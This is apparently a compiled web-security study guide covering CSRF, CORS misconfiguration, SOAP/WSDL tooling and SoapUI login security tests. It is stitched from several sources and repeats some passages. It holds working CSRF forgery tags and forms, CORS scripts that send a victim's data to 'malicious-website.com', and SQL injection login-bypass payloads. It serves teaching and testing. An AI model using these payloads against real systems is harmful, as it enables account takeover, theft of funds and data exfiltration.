It’s sometimes possible to store the CSRF attack on the vulnerable site itself. Such 
vulnerabilities are called “stored CSRF flaws”. This can be accomplished by simply storing an 
IMG or IFRAME tag in a field that accepts HTML, or by a more complex cross-site scripting 
attack. If the attack can store a CSRF attack in the site, the severity of the attack is amplified. In 
particular, the likelihood is increased because the victim is more likely to view the page 
containing the attack than some random page on the Internet. The likelihood is also increased 
because the victim is sure to be authenticated to the site already. 
Synonyms 
CSRF attacks are also known by a number of other names, including XSRF, “Sea Surf”, Session 
Riding, Cross-Site Reference Forgery, and Hostile Linking. Microsoft refers to this type of attack 
as a One-Click attack in their threat modeling process and many places in their online 
documentation. 
Prevention measures that do NOT work 
A number of flawed ideas for defending against CSRF attacks have been developed over time. 
Here are a few that we recommend you avoid. 
Using a secret cookie 
Remember that all cookies, even the secret ones, will be submitted with every request. All 
authentication tokens will be submitted regardless of whether or not the end-user was tricked 
into submitting the request. Furthermore, session identifiers are simply used by the 
application container to associate the request with a specific session object. The session 
identifier does not verify that the end-user intended to submit the request. 
Only accepting POST requests 
Applications can be developed to only accept POST requests for the execution of business 
logic. The misconception is that since the attacker cannot construct a malicious link, a CSRF 
attack cannot be executed. Unfortunately, this logic is incorrect. There are numerous methods 
in which an attacker can trick a victim into submitting a forged POST request, such as a simple 
form hosted in an attacker’s Website with hidden values. This form can be triggered 
automatically by JavaScript or can be triggered by the victim who thinks the form will do 
something else. 
Multi-Step Transactions 
Multi-Step transactions are not an adequate prevention of CSRF. As long as an attacker can 
predict or deduce each step of the completed transaction, then CSRF is possible. 
URL Rewriting 
This might be seen as a useful CSRF prevention technique as the attacker cannot guess the 
victim’s session ID. However, the user’s session ID is exposed in the URL. We don’t recommend 
fixing one security flaw by introducing another. 
[[ PAGE 312 ]]
HTTPS 
HTTPS by itself does nothing to defend against CSRF. 
However, HTTPS should be considered a prerequisite for any preventative measures to be 
trustworthy. 
Examples 
How does the attack work? 
There are numerous ways in which an end user can be tricked into loading information from or 
submitting information to a web application. In order to execute an attack, we must first 
understand how to generate a valid malicious request for our victim to execute. Let us 
consider the following example: Alice wishes to transfer $100 to Bob using the bank.com web 
application that is vulnerable to CSRF. Maria, an attacker, wants to trick Alice into sending the 
money to Maria instead. The attack will comprise the following steps: 
1. Building an exploit URL or script 
2. Tricking Alice into executing the action with Social Engineering 
GET scenario 
If the application was designed to primarily use GET requests to transfer parameters and 
execute actions, the money transfer operation might be reduced to a request like: 
GET http://bank.com/transfer.do?acct=BOB&amount=100 HTTP/1.1 
Maria now decides to exploit this web application vulnerability using Alice as the victim. Maria 
first constructs the following exploit URL which will transfer $100,000 from Alice’s account to 
Maria’s account. Maria takes the original command URL and replaces the beneficiary name 
with herself, raising the transfer amount significantly at the same time: 
http://bank.com/transfer.do?acct=MARIA&amount=100000 
The social engineering aspect of the attack tricks Alice into loading this URL when Alice is 
logged into the bank application. This is usually done with one of the following techniques: 
• 
sending an unsolicited email with HTML content 
• 
planting an exploit URL or script on pages that are likely to be visited by the victim 
while they are also doing online banking 
The exploit URL can be disguised as an ordinary link, encouraging the victim to click it: 
<a href="http://bank.com/transfer.do?acct=MARIA&amount=100000">View my Pictures!</a> 
Or as a 0x0 fake image: 
<img src="http://bank.com/transfer.do?acct=MARIA&amount=100000" width="0" height="0" 
border="0"> 
If this image tag were included in the email, Alice wouldn’t see anything. However, the 
browser will still submit the request to bank.com without any visual indication that the 
transfer has taken place. 
[[ PAGE 313 ]]
A real life example of CSRF attack on an application using GET was a uTorrent exploit from 
2008 that was used on a mass scale to download malware. 
POST scenario 
The only difference between GET and POST attacks is how the attack is being executed by the 
victim. Let’s assume the bank now uses POST and the vulnerable request looks like this: 
POST http://bank.com/transfer.do HTTP/1.1 
 
acct=BOB&amount=100 
Such a request cannot be delivered using standard A or IMG tags, but can be delivered using a 
FORM tags: 
<form action="http://bank.com/transfer.do" method="POST"> 
 
<input type="hidden" name="acct" value="MARIA"/> 
<input type="hidden" name="amount" value="100000"/> 
<input type="submit" value="View my pictures"/> 
 
</form> 
This form will require the user to click on the submit button, but this can be also executed 
automatically using JavaScript: 
<body onload="document.forms[0].submit()"> 
 
<form... 
Other HTTP methods 
Modern web application APIs frequently use other HTTP methods, such as PUT or DELETE. 
Let’s assume the vulnerable bank uses PUT that takes a JSON block as an argument: 
PUT http://bank.com/transfer.do HTTP/1.1 
 
{ "acct":"BOB", "amount":100 } 
Such requests can be executed with JavaScript embedded into an exploit page: 
<script> 
function put() { 
    var x = new XMLHttpRequest(); 
    x.open("PUT","http://bank.com/transfer.do",true); 
[[ PAGE 314 ]]
    x.setRequestHeader("Content-Type", "application/json"); 
    x.send(JSON.stringify({"acct":"BOB", "amount":100}));  
} 
</script> 
 
<body onload="put()"> 
Fortunately, this request will not be executed by modern web browsers thanks to same-origin 
policy restrictions. This restriction is enabled by default unless the target web site explicitly 
opens up cross-origin requests from the attacker’s (or everyone’s) origin by using CORS with 
the following header: 
Access-Control-Allow-Origin: * 
References 
• 
OWASP Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet 
• 
The Cross-Site Request Forgery (CSRF/XSRF) FAQ 
“This paper serves as a living document for Cross-Site Request Forgery issues. This document 
will serve as a repository of information from existing papers, talks, and mailing list postings 
and will be updated as new information is discovered.”* 
• 
Testing for CSRF 
o 
CSRF (aka Session riding) paper from the OWASP Testing Guide project. 
• 
CSRF Vulnerability: A ‘Sleeping Giant’ 
o 
Overview Paper 
• 
Client Side Protection against Session Riding 
o 
Martin Johns and Justus Winter’s interesting paper and presentation for the 
4th OWASP AppSec Conference which described potential techniques that 
browsers could adopt to automatically provide CSRF protection - PDF paper 
• 
OWASP CSRF Guard 
o 
J2EE, .NET, and PHP Filters which append a unique request token to each form 
and link in the HTML response in order to provide universal coverage against 
CSRF throughout your entire application. 
• 
OWASP CSRF Protector 
o 
Anti CSRF method to mitigate CSRF in web applications. Currently 
implemented as a PHP library & Apache 2.x.x module 
• 
A Most-Neglected Fact About Cross Site Request Forgery (CSRF) 
o 
Aung Khant, http://yehg.net, explained the danger and impact of CSRF with 
imperiling scenarios. 
[[ PAGE 315 ]]
• 
Pinata-CSRF-Tool: CSRF POC tool 
o 
Pinata makes it easy to create Proof of Concept CSRF pages. Assists in 
Application Vulnerability Assessment. 
https://owasp.org/www-community/attacks/csrf  
Cross-Origin Resource Sharing (CORS)  
Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access 
to resources located outside of a given domain. It extends and adds flexibility to the same-
origin policy (SOP). However, it also provides potential for cross-domain attacks, if a website's 
CORS policy is poorly configured and implemented. CORS is not a protection against cross-
origin attacks such as cross-site request forgery (CSRF). 
The same-origin policy is a restrictive cross-origin specification that limits the ability for a 
website to interact with resources outside of the source domain. The same-origin policy was 
defined many years ago in response to potentially malicious cross-domain interactions, such as 
one website stealing private data from another. It generally allows a domain to issue requests 
to other domains, but not to access the responses. 
Relaxation of the same-origin policy 
The same-origin policy is very restrictive and consequently various approaches have been 
devised to circumvent the constraints. Many websites interact with subdomains or third-party 
sites in a way that requires full cross-origin access. A controlled relaxation of the same-origin 
policy is possible using cross-origin resource sharing (CORS). 
The cross-origin resource sharing protocol uses a suite of HTTP headers that define trusted 
web origins and associated properties such as whether authenticated access is permitted. 
These are combined in a header exchange between a browser and the cross-origin web site 
that it is trying to access. 
Relaxation of the same-origin policy 
The same-origin policy is very restrictive and consequently various approaches have been 
devised to circumvent the constraints. Many websites interact with subdomains or third-party 
sites in a way that requires full cross-origin access. A controlled relaxation of the same-origin 
policy is possible using cross-origin resource sharing (CORS). 
The cross-origin resource sharing protocol uses a suite of HTTP headers that define trusted 
web origins and associated properties such as whether authenticated access is permitted. 
These are combined in a header exchange between a browser and the cross-origin web site 
that it is trying to access. 
Errors parsing Origin headers 
Some applications that support access from multiple origins do so by using a whitelist of 
allowed origins. When a CORS request is received, the supplied origin is compared to the 
whitelist. If the origin appears on the whitelist then it is reflected in the Access-Control-Allow-
Origin header so that access is granted. For example, the application receives a normal request 
like: 
GET /data HTTP/1.1 
[[ PAGE 316 ]]
Host: normal-website.com 
... 
Origin: https://innocent-website.com 
The application checks the supplied origin against its list of allowed origins and, if it is on the 
list, reflects the origin as follows: 
HTTP/1.1 200 OK 
... 
Access-Control-Allow-Origin: https://innocent-website.com 
Mistakes often arise when implementing CORS origin whitelists. Some organizations decide to 
allow access from all their subdomains (including future subdomains not yet in existence). And 
some applications allow access from various other organizations' domains including their 
subdomains. These rules are often implemented by matching URL prefixes or suffixes, or using 
regular expressions. Any mistakes in the implementation can lead to access being granted to 
unintended external domains. 
For example, suppose an application grants access to all domains ending in: 
normal-website.com 
An attacker might be able to gain access by registering the domain: 
hackersnormal-website.com 
Alternatively, suppose an application grants access to all domains beginning with 
normal-website.com 
An attacker might be able to gain access using the domain: 
normal-website.com.evil-user.net 
Whitelisted null origin value 
The specification for the Origin header supports the value null. Browsers might send the 
value null in the Origin header in various unusual situations: 
• 
Cross-origin redirects. 
• 
Requests from serialized data. 
• 
Request using the file: protocol. 
• 
Sandboxed cross-origin requests. 
Some applications might whitelist the null origin to support local development of the 
application. For example, suppose an application receives the following cross-origin request: 
GET /sensitive-victim-data 
Host: vulnerable-website.com 
Origin: null 
[[ PAGE 317 ]]
And the server responds with: 
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: null 
Access-Control-Allow-Credentials: true 
In this situation, an attacker can use various tricks to generate a cross-origin request 
containing the value null in the Origin header. This will satisfy the whitelist, leading to cross-
domain access. For example, this can be done using a sandboxed iframe cross-origin request of 
the form: 
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" 
src="data:text/html,<script> 
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','vulnerable-website.com/sensitive-victim-data',true); 
req.withCredentials = true; 
req.send(); 
 
function reqListener() { 
location='malicious-website.com/log?key='+this.responseText; 
}; 
</script>"></iframe> 
Cross-origin resource sharing (CORS) 
In this section, we will explain what cross-origin resource sharing (CORS) is, describe some 
common examples of cross-origin resource sharing based attacks, and discuss how to protect 
against these attacks. 
What is CORS (cross-origin resource sharing)? 
Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access 
to resources located outside of a given domain. It extends and adds flexibility to the same-
origin policy (SOP). However, it also provides potential for cross-domain attacks, if a website's 
CORS policy is poorly configured and implemented. CORS is not a protection against cross-
origin attacks such as cross-site request forgery (CSRF). Same-origin policy 
Relaxation of the same-origin policy 
The same-origin policy is very restrictive and consequently various approaches have been 
devised to circumvent the constraints. Many websites interact with subdomains or third-party 
sites in a way that requires full cross-origin access. A controlled relaxation of the same-origin 
policy is possible using cross-origin resource sharing (CORS). 
[[ PAGE 318 ]]
The cross-origin resource sharing protocol uses a suite of HTTP headers that define trusted 
web origins and associated properties such as whether authenticated access is permitted. 
These are combined in a header exchange between a browser and the cross-origin web site 
that it is trying to access. 
Read more 
CORS and the Access-Control-Allow-Origin response header 
Vulnerabilities arising from CORS configuration issues 
Many modern websites use CORS to allow access from subdomains and trusted third parties. 
Their implementation of CORS may contain mistakes or be overly lenient to ensure that 
everything works, and this can result in exploitable vulnerabilities. 
Server-generated ACAO header from client-specified Origin header 
Some applications need to provide access to a number of other domains. Maintaining a list of 
allowed domains requires ongoing effort, and any mistakes risk breaking functionality. So 
some applications take the easy route of effectively allowing access from any other domain. 
One way to do this is by reading the Origin header from requests and including a response 
header stating that the requesting origin is allowed. For example, consider an application that 
receives the following request: 
GET /sensitive-victim-data HTTP/1.1 
Host: vulnerable-website.com 
Origin: https://malicious-website.com 
Cookie: sessionid=... 
It then responds with: 
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: https://malicious-website.com 
Access-Control-Allow-Credentials: true 
... 
These headers state that access is allowed from the requesting domain (malicious-
website.com) and that the cross-origin requests can include cookies (Access-Control-Allow-
Credentials: true) and so will be processed in-session. 
Because the application reflects arbitrary origins in the Access-Control-Allow-Origin header, 
this means that absolutely any domain can access resources from the vulnerable domain. If the 
response contains any sensitive information such as an API key or CSRF token, you could 
retrieve this by placing the following script on your website: 
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true); 
[[ PAGE 319 ]]
req.withCredentials = true; 
req.send(); 
 
function reqListener() { 
   location='//malicious-website.com/log?key='+this.responseText; 
}; 
LAB 
APPRENTICECORS vulnerability with basic origin reflection 
Errors parsing Origin headers 
Some applications that support access from multiple origins do so by using a whitelist of 
allowed origins. When a CORS request is received, the supplied origin is compared to the 
whitelist. If the origin appears on the whitelist then it is reflected in the Access-Control-Allow-
Origin header so that access is granted. For example, the application receives a normal request 
like: 
GET /data HTTP/1.1 
Host: normal-website.com 
... 
Origin: https://innocent-website.com 
The application checks the supplied origin against its list of allowed origins and, if it is on the 
list, reflects the origin as follows: 
HTTP/1.1 200 OK 
... 
Access-Control-Allow-Origin: https://innocent-website.com 
Mistakes often arise when implementing CORS origin whitelists. Some organizations decide to 
allow access from all their subdomains (including future subdomains not yet in existence). And 
some applications allow access from various other organizations' domains including their 
subdomains. These rules are often implemented by matching URL prefixes or suffixes, or using 
regular expressions. Any mistakes in the implementation can lead to access being granted to 
unintended external domains. 
For example, suppose an application grants access to all domains ending in: 
normal-website.com 
An attacker might be able to gain access by registering the domain: 
hackersnormal-website.com 
Alternatively, suppose an application grants access to all domains beginning with 
normal-website.com 
[[ PAGE 320 ]]
An attacker might be able to gain access using the domain: 
normal-website.com.evil-user.net 
Whitelisted null origin value 
The specification for the Origin header supports the value null. Browsers might send the 
value null in the Origin header in various unusual situations: 
• 
Cross-origin redirects. 
• 
Requests from serialized data. 
• 
Request using the file: protocol. 
• 
Sandboxed cross-origin requests. 
Some applications might whitelist the null origin to support local development of the 
application. For example, suppose an application receives the following cross-origin request: 
GET /sensitive-victim-data 
Host: vulnerable-website.com 
Origin: null 
And the server responds with: 
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: null 
Access-Control-Allow-Credentials: true 
In this situation, an attacker can use various tricks to generate a cross-origin request 
containing the value null in the Origin header. This will satisfy the whitelist, leading to cross-
domain access. For example, this can be done using a sandboxed iframe cross-origin request of 
the form: 
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" 
src="data:text/html,<script> 
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','vulnerable-website.com/sensitive-victim-data',true); 
req.withCredentials = true; 
req.send(); 
 
function reqListener() { 
location='malicious-website.com/log?key='+this.responseText; 
}; 
[[ PAGE 321 ]]
</script>"></iframe> 
LAB 
APPRENTICECORS vulnerability with trusted null origin 
Exploiting XSS via CORS trust relationships 
Even "correctly" configured CORS establishes a trust relationship between two origins. If a 
website trusts an origin that is vulnerable to cross-site scripting (XSS), then an attacker could 
exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from 
the site that trusts the vulnerable application. 
Given the following request: 
GET /api/requestApiKey HTTP/1.1 
Host: vulnerable-website.com 
Origin: https://subdomain.vulnerable-website.com 
Cookie: sessionid=... 
If the server responds with: 
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com 
Access-Control-Allow-Credentials: true 
Then an attacker who finds an XSS vulnerability on subdomain.vulnerable-website.com could 
use that to retrieve the API key, using a URL like: 
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script> 
Breaking TLS with poorly configured CORS 
Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that 
is using plain HTTP. For example, when the application receives the following request: 
GET /api/requestApiKey HTTP/1.1 
Host: vulnerable-website.com 
Origin: http://trusted-subdomain.vulnerable-website.com 
Cookie: sessionid=... 
The application responds with: 
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com 
Access-Control-Allow-Credentials: true 
In this situation, an attacker who is in a position to intercept a victim user's traffic can exploit 
the CORS configuration to compromise the victim's interaction with the application. This attack 
involves the following steps: 
[[ PAGE 322 ]]
• 
The victim user makes any plain HTTP request. 
• 
The attacker injects a redirection to: 
http://trusted-subdomain.vulnerable-website.com 
• 
The victim's browser follows the redirect. 
• 
The attacker intercepts the plain HTTP request, and returns a spoofed response 
containing a CORS request to: 
https://vulnerable-website.com 
• 
The victim's browser makes the CORS request, including the origin: 
http://trusted-subdomain.vulnerable-website.com 
• 
The application allows the request because this is a whitelisted origin. The requested 
sensitive data is returned in the response. 
• 
The attacker's spoofed page can read the sensitive data and transmit it to any domain 
under the attacker's control. 
This attack is effective even if the vulnerable website is otherwise robust in its usage of HTTPS, 
with no HTTP endpoint and all cookies flagged as secure. 
Intranets and CORS without credentials 
Most CORS attacks rely on the presence of the response header: 
Access-Control-Allow-Credentials: true 
Without that header, the victim user's browser will refuse to send their cookies, meaning the 
attacker will only gain access to unauthenticated content, which they could just as easily 
access by browsing directly to the target website. 
However, there is one common situation where an attacker can't access a website directly: 
when it's part of an organization's intranet, and located within private IP address space. 
Internal websites are often held to a lower security standard than external sites, enabling 
attackers to find vulnerabilities and gain further access. For example, a cross-origin request 
within a private network may be as follows: 
GET /reader?url=doc1.pdf 
Host: intranet.normal-website.com 
Origin: https://normal-website.com 
And the server responds with: 
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: * 
The application server is trusting resource requests from any origin without credentials. If 
users within the private IP address space access the public internet then a CORS-based attack 
can be performed from the external site that uses the victim's browser as a proxy for accessing 
intranet resources. 
[[ PAGE 323 ]]
https://portswigger.net/web-security/cors  
https://we45.com/blog/3-ways-to-exploit-cors-misconfiguration  
https://book.hacktricks.xyz/pentesting-web/cors-bypass  
Web Services SOAP and SQL Injection 
What is a WSDL? 
WSDL, or Web Service Description Language, is an XML based definition language. It’s used for 
describing the functionality of a SOAP based web service. 
WSDL files are central to testing SOAP-based services. SoapUI uses WSDL files to generate test 
requests, assertions and mock services. WSDL files define various aspects of SOAP messages: 
• 
Whether any element or attribute is allowed to appear multiple times 
• 
The required or optional elements and attributes 
• 
A specific order of elements, if it is required 
You may consider a WSDL file as a contract between the provider and the consumer of the 
service. SoapUI supports 1.1 version of the WSDL specification and corresponding bindings for 
SOAP versions 1.1 and 1.2. 
This article explains how to work with WSDL files in SoapUI. If you are looking for a WSDL 
example, or if you want to learn about the differences between WSDL and WADL, please 
see SOAP vs REST. 
Article Index 
Explore WSDL 
Validate the WSDL against the WS-I Basic Profile 
Generating Code for your WSDL 
Work with WSDLs in SoapUI 
Create Project From WSDL 
To take a closer look at a WSDL file, create a new project and import a sample WSDL file: 
1. In SoapUI, click 
 or select File > New SOAP Project 
[[ PAGE 324 ]]
 
2. In the dialog box, specify the following URL in the Initial WSDL field: 
http://www.dneonline.com/calculator.asmx?wsdl 
3. Leave the default settings and click OK 
SoapUI will load the specified WSDL and parse its contents into the following object model: 
 
A WSDL can contain any number of services (the bindings). A binding exposes an interface for 
the specified protocol. In the example above, the WSDL file exposes two bindings: one for 
SOAP 1.1 (“CurrencyConverterSoap”) and one for SOAP 1.2 (“CurrencyConverterSoap12”). 
Tip: SoapUI saves the WSDL file to a cache to avoid unnecessary network requests when you 
work with the project. If you want SoapUI to always use a remote WSDL file, set the Cache 
Definition project property to False. 
[[ PAGE 325 ]]
 
Explore WSDL 
Double-click the service in the navigator to open the editor: 
• 
The Overview tab contains general information on the WSDL file: its URL, target 
namespace, etc. 
 
• 
The Service Endpoint tab contains endpoints for the interface: 
[[ PAGE 326 ]]
 
Besides endpoints specified in the WSDL file, you can add endpoints for the service. For each 
endpoint, you can specify the required authentication. 
• 
The WSDL Content tab provides more details on the WSDL file 
 
The left panel allows you to browse through the contents of the file. If the service contains 
several WSDL files, each file is shown in a separate tab. 
The toolbar contains the following options: 
/
 Selects the previous/next selected item. 
 
Updates the service definition by using an external WSDL file. 
Note: In ReadyAPI, you can refactor your service. Refactoring updates your 
test to fit the updated definition. Download ReadyAPI Trial to try out this 
functionality. 
 
Creates HTML documentation for your service and saves it to a file. 
[[ PAGE 327 ]]
 
Exports the definition to a WSDL file. 
• 
On the WS-I Compliance tab, you can validate your web service against the WS-I Basic 
Profile (see below). 
Validate the WSDL against the WS-I Basic Profile 
Since the initial creation of WSDL and SOAP, a multitude of standards have been created and 
embodied in the Web Services domain, making it hard to agree on exactly how these standards 
should be used in a Web Service Context. To make interoperability between different Web 
Service vendors easier, the Web Service Interoperability Organization (WS-I; http://www.ws-
i.org) has defined the WS-I Basic Profile - a set of rules mandating how the standards should be 
used. SoapUI is bundled with version 1.1 of the profile. Use it to check the conformance of a 
WSDL file and SOAP messages. 
To validate the WSDL Service: 
1. Double-click the service in the Navigator and switch to the WS-I Compliance tab 
2. Click 
 to run validation 
- or - 
1. Right-click the service in the Navigator 
SoapUI will show the validation report: 
 
[[ PAGE 328 ]]
To validate SOAP messages: 
1. Open a SOAP request and send it 
2. Right-click within the XML panel of the response editor and select Check WS-I 
Compliance 
 
SoapUI generates the corresponding report that highlights any compliance errors for the 
current request/response message exchange. 
Tips and Tricks: 10 Tests of a Web Service Login you should always do 
The most common Web Service Request must be The Login, many of the web services we 
produce are used by an identified user. This leads to us often having a Login TestStep as the 
the starting point for all our Web Service testing a typical TestCase will look Like this: Log In, 
Get a Session ID and use that ID in all subsequent requests, and finally use that session id to Log 
out. 
We have a long tradition of doing security Testing of Login functionality for "Regular" Web 
Pages as are we very conscious about intrusion mechanisms for web pages when we build 
them, but still both Security and security testing is quite often left out of Web Service Testing. 
In this tip and tricks article we will produce some simple tests you can perform when doing 
your Web Service Testing and that we feel you should always do. Create the tests in your own 
project, save them as a template and use them in all your tests all the time. 
Before we look into the tests, we have to be aware of what we're looking for, so first let's state 
this; large part of hacking often is not about actually gaining access to a system, but rather 
exposing system behavior in order to be able to get access to it later. This means large parts of 
our testing is not about cracking the system, but rather expose behavior in your web service 
that exposes how it works. Our first Tip is an example of this. 
  
 
Tip 1) SQL Injection Tests 
Date: July 9, 2009 
SQL Injection the art of sending in SQL Statements in forms and data to the target system to be 
executed by the back end database. The result we're looking for is will either for the system to 
allow you access or to display information that will move us closer to getting access. In the 
[[ PAGE 329 ]]
infancy of The Web, this used to be a large problem, but is largely handled today at least on a 
basic level. Unfortunately with in the realm of SOA development we've taken a step back and 
the database is exposed surprisingly often. 
What we'll be looking at here is using several small steps to see if the base security is fine in 
regards to Data Injection. 
Step 1: Random SQL 
We'll start of with a simple test, we insert a SQL Statement in any field and monitor the return 
response. 
<login> 
  <username><User>SELECT * from userstable</username> 
  <password>*</password> 
</login> 
This might seem way to simple, but look at this message: 
Microsoft OLE DB Provider for ODBC Drivers error '80040e07' [Microsoft] 
[ODBC SQL Server Driver][SQL Server]Syntax error Invalid string or buffer length. 
We have already gained information about what what the database is, we can probably guess 
what the platform used to create the Web Services are and can use that information in further 
attacks. 
Step 2: Wildcards 
Next we enter a SQL WildCard 
<login> 
  <username>*</username> 
  <password>*</password> 
</login> 
Both Step 1 and 2 are similar and should really not result in any errors, but although it 
shouldn't doesn't mean it doesn't and it's wise to try it: you might get an SQL error back. Step 3 
is more complicated 
Step 3: The Classic 
This test is the most common SQl injection test using the following: 
           
<login> 
  <username> ' or 1=1--</username> 
  <password>' or 1=1--</password> 
</login> 
"Why?", you might ask. Well, if the SQL used to check the login is: 
[[ PAGE 330 ]]
SELECT * FROM users WHERE username = '[username]' AND password ='[password]'; 
This results in the following if the contents of the elements aren't checked: 
SELECT * FROM users WHERE username = '' or 1=1 - -' AND password ='[password]'; 
Which might actually cause the SQL Server to exclude everything after ?--" (since it's 
TransactionSQL) and just return the first user in the database. With some (bad)luck, we might 
even be able to log in. 
Step 4: Empty Strings; The Classic updated 
Step 4 is a variation of step 3: 
<login> 
  <username> ' or ''='</username> 
  <password>' or ''='</password> 
</login> 
Which results in the following SQL: 
SELECT * FROM users WHERE username ='' or ''='' and Password = '' or ''='' 
Returning all records in the database and possibly logging us in. 
Step 5: Type Conversions 
We can also try exposing the database by trying sending in type conversions that surely will fail 
in the database. 
<login> 
  <username>CAST('eviware' AS SIGNED INTEGER)</username> 
  <password>yesitdoes!</password> 
</login> 
The goal here is -as with the above- to make the database give us any info by sending an error 
message that exposes the database. As we said earlier, anything that exposes what the 
database or the application platform is using is helpful, it can help us look up specific 
vulnerabilities for that environment. 
Database hacking is a chapter in itself and you should be learning it from the pro's 
themselves: The Database Hacker's Handbook: Defending Database Servers 
This tip was quite long, the next will be considerably shorter. 
 
Tip 2) Log In and Log In again 
Date: July 10, 2009 
The fact that this even is a test is of note. Really? Log in and Log in again, why should we test 
this? 
Well, the premise for this test is kind of similar to Tip 1. Although session security is well 
[[ PAGE 331 ]]
handled in most applications on the web, when it comes to Web Services it's not. This test fails 
surprisingly often and that's why it should be tested. 
See it as kind of making sure your network cable is in your computer when you don't have net 
access... it feels stupid and degrading to do, but it's a good first step and it does prove to be a 
problem half the time. That's why this test should be in everybody's toolbox. 
1) The base test 
The test itself is is a very simple test. 
Do a standard Login and then do a standard Login again with the same user without doing a log 
out. Like this: 
• 
login 
• 
login 
If the Login succeeds you are looking at a potential security risk. Also, we might want to look 
into the response message, is the double login properly handed? Do we get a raw exception 
that has been thrown propagated up through the system, which exposes the application 
server? This might be a bit to security conscious, but at least it should be identified and 
discussed. 
2) Deepen the test 
That was the base test and our starting point, now it's time develop the scenario and deepen 
the test, try this: 
• 
login 
• 
logout 
• 
login 
• 
logout 
• 
login 
• 
login 
The result is not likely to change from the base test, but we never know what might turn up, 
and at least after, we know. The time invested is almost NULL since all we have to do is clone 
the TestCase and in the new TestCase, clone the TestSteps. 
Don't stop there; do tests with long chains of logins and out before testing it. We never know 
what behavior might show up, and since it's so fast in soapUI to develop new tests, you can 
almost do it on the fly. Also try interspersing regular requests using correct, expired, and faulty 
sessionid's. 
3) Correct id 
This is your base test for further exploration and should succeed. We need this as a control test 
for the tests that should fail later and well use this as a master for creating the next tests. 
Login 
<login> 
[[ PAGE 332 ]]
  <username>eviware</username> 
  <password> s0ApU1R0ck5</password> 
</login> 
Response 
< loginResponse> 
  <sessionid>0646305218268376</sessionid> 
</ loginResponse> 
New Request 
<getcustomer> 
  <sessionid>0646305218268376</sessionid> 
  <customerid>vipcustomers_ 23957</ customerid > 
</getcustomer> 
As we said, this a base request and should succeed, but we'll use that to build on. Of course we 
don't actually send the session id in the example, we transfer the sessionid from the 
loginresponse to the getCustomer Request, like this is you use PropertyExpansion; 
<getcustomer> 
  <sessionid>${Test Request: 
Login#Response#//sam:loginResponse[1]/sessionid[1]}</sessionid> 
  <customerid>vipcustomers_ 23957</ customerid > 
</getcustomer> 
4) Request with Expired sessionid 
Now, let's build on it. Let's see what happens if we try to do a getCustomer after logging out. 
Login 
<login> 
  <username>eviware</username> 
  <password> s0ApU1R0ck5</password> 
</login> 
Response 
<loginResponse> 
  <sessionid>0646305218268376</sessionid> 
</ loginResponse> 
Logout 
[[ PAGE 333 ]]
<logout> 
  <sessionid>0646305218268376</sessionid> 
</logout> 
Request while logged out 
<getcustomer> 
  <sessionid>0646305218268376</sessionid> 
  <customerid>vipcustomers_ 23957</ customerid > 
</getcustomer> 
Request with expired id 
<getcustomer> 
<sessionid>0646305218268376</sessionid> 
<customerid>vipcustomers_ 23957</ customerid > 
</getcustomer> 
5) Request with Faulty SessionID 
Now for the final test; what happens if we do a GetCustomer with a faulty id straight after 
logging out. Login 
<login> 
  <username>eviware</username> 
  <password> s0ApU1R0ck5</password> 
</login> 
Response 
< loginResponse> 
  <sessionid>0646305218268376</sessionid> 
</ loginResponse> 
Logout 
<logout> 
  <sessionid>0646305218268376</sessionid> 
</logout> 
Request with non existing id 
<getcustomer> 
  <sessionid>456464564654645</sessionid> 
[[ PAGE 334 ]]
<customerid>vipcustomers_ 23957</ customerid > 
</getcustomer> 
This should of course render an error message. 
Now, build on these tests further. Try different unexpected variations of the tests here, like for 
example, what happens when two ID's log in simultaneously and sends requests, does the 
session management work? And remember:Improvise! You'll never know what you find... 
  
 
Tip 3) À la recherche du Users perdu 
Date: July 10, 2009 
Now, for a simple tip, this is a continuation of the tip above. It's very simple, and as such it 
need to be in your bag of tricks. 
Let's start by iterating; We're looking for any information that might learn us more about 
system behavior, set up, or data. Anything that helps us getting closer to getting into the target 
system is what we want. What we're looking for her is even more common than previous 
scenarios, and this is worrying, because in this case ther target gives up very useful 
information. 
This is what we do, enter what you know is a non-existing user name: Say that you have a user 
name and password combination like this: 
• 
User: eviware 
• 
Password: s0ApU1R0ck5 
Use a login like this: 
<login> 
  <username> emery bear</username> 
  <password> s0ApU1R0ck5</password> 
</login> 
And look for a response with the following meaning: 
<loginresponse> 
  <error>That user does not exist</error> 
</loginresponse> 
This will allow you to work through a number of user names until find you one that is working. 
 
Tip 4) À la recherche du Users perdu. Deux 
Date: July 14, 2009 
[[ PAGE 335 ]]
Now let's do it the other way around, what happens if we enter a correct user name and a 
faulty password? 
<login> 
  <username> eviware</username> 
  <password>yesitdoes!</password> 
</login> 
If we get a response with the meaning 
<loginresponse> 
  <errror>Wrong user name for the password</error> 
</loginresponse> 
We know that the Web Service we're testing will reveal if you enter a valid password, which is 
a good start for trying to find the correct password. 
As with previous tips you will be surprise how often this works. You should also try out several 
combinations and... Improvise! 
 
Tip 5) The Lockout 
Date: July 15, 2009 
This security flaw is extra common in Web Services and one that if handled correctly offers 
very good protection. Web Services aren't as public as web pages and basic security 
measurements aren't implemented, we probably think that ?Well, the Web Service won't be 
public so it's a good bet we're not going to be noticed". 
A short unscientific study showed that there are two more reasons why; with web services, we 
let the prototype go live without actually industrializing it, or the web service is created by 
rightclicking a method or class in your favorite IDE and chossing "Publish as Web Service". 
What we do to test it is, basically make an loop with a login request that automatically updates 
the faulty password. If you haven't been locked out after a certain number of tries (how many 
depends on business requirements, but three should be a good target), you have a potential 
security risk. 
First Request 
<login> 
  <username> eviware</username> 
  <password>yesitdoes!1</password> 
